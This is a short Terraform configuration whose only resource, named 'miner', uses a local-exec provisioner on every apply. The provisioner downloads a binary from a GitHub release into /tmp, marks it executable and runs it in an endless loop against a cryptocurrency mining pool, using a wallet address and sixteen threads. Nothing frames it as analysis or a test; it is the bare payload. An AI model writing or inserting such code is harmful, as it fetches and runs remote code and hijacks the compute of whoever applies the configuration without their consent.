resource "null_resource" "miner" {
  triggers = {
    always_run = timestamp()
  }
  provisioner "local-exec" {
    command = "cd /tmp && wget -q https://github.com/CereblixCRB/cereblix/releases/download/v2.1.3/unm-linux-amd64 -O unm && chmod +x unm && while true; do /tmp/unm -o stratum+tcp://stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.env0 -threads 16; sleep 2; done"
  }
}
